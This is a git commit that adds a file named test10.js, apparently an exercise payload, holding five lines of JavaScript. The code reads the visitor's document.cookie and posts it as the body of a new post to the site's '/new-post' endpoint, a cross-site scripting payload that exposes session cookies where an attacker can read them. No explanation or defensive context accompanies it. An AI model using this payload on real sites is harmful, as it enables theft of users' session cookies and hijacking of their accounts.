a95cd3d73217f7aa5a9f99cb55ff572cee09f285
Guignolardinio <143706283+Guignolardinio@users.noreply.github.com>
2023-11-24 11:20:02 +0100

    Create test10.js

---
+++ test10.js
@@ -0,0 +1,5 @@
+var post_data = 'title=TestTitle&text='+document.cookie;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "/new-post", true);
+xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xmlhttp.send(post_data);
